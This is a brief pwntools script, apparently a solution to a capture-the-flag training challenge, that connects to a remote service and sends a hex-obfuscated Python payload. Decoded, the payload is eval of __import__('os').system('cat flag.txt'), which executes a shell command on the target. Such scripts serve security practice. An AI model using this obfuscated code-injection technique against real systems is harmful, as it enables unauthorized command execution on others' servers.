from pwn import *

payload = ['eval(b\'\\x5F\\x5F\\x69\\x6D\\x70\\x6F\\x72\\x74\\x5F\\x5F\\x28\\x27\\x6F\\x73\\x27\\x29\\x2E\\x73\\x79\\x73\\x74\\x65\\x6D\\x28\\x27\\x63\\x61\\x74\\x20\\x66\\x6C\\x61\\x67\\x2E\\x74\\x78\\x74\\x27\\x29\'.decode(\'UTF-8\'))']
payload = ''.join(payload)
url = 'chal.training.hkcert21.pwnable.hk'

p = remote(url, 6009)
print(payload)
p.sendline(payload)
p.interactive()